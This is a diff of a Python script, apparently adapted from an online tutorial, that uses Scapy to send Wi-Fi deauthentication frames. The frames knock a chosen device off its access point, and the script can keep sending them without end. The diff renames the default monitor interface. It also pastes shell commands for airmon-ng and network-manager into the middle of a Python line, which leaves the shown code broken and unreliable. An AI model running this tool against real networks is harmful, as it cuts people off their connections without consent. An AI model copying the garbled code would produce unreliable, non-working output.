@@ -1,21 +1,19 @@
 #!/usr/bin/env python3
-from scapy.all import (
-  RadioTap,    # Adds additional metadata to an 802.11 frame
-  Dot11,       # For creating 802.11 frame
-  Dot11Deauth, # For creating deauth frame
-  sendp        # for sending packets
-)
+from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
+from scapy.sendrecv import sendp
+
 
 # source: https://www.thepythoncode.com/code/force-a-device-to-disconnect-scapy
-
-def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="wlan0mon", verbose=1):
+def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="wlp1s0mon", verbose=1):
     # ask user for the reason code that he wishes to use
     reason = int(input("Choose one reason code : \n"
-                       "1 - unspecified \n"
+                       "1 - Unspecified \n"
                        "4 - Disassociated due to inactivity \n"
                        "5 - Disassociated because AP is unable to handle all currently associated stations \n"
                        "8 - Deauthenticated because sending STA is leaving BSS \n"
-                       "Reason code : "))
+                       "Reason code : "))sudo airmon-ng stop wlp1s0mon
+
+service network-manager start
     
     # addr1: destination MAC
     # addr2: source MAC
@@ -41,7 +39,7 @@ if __name__ == "__main__":
     parser.add_argument("gateway", help="Gateway MAC address that target is authenticated with")
     parser.add_argument("-c" , "--count", help="number of deauthentication frames to send, specify 0 to keep sending infinitely, default is 0", default=0)
     parser.add_argument("--interval", help="The sending frequency between two frames sent, default is 100ms", default=0.1)
-    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0mon'", default="wlan0mon")
+    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlp1s0mon'", default="wlp1s0mon")
     parser.add_argument("-v", "--verbose", help="wether to print messages", action="store_true")
 
     args = parser.parse_args()
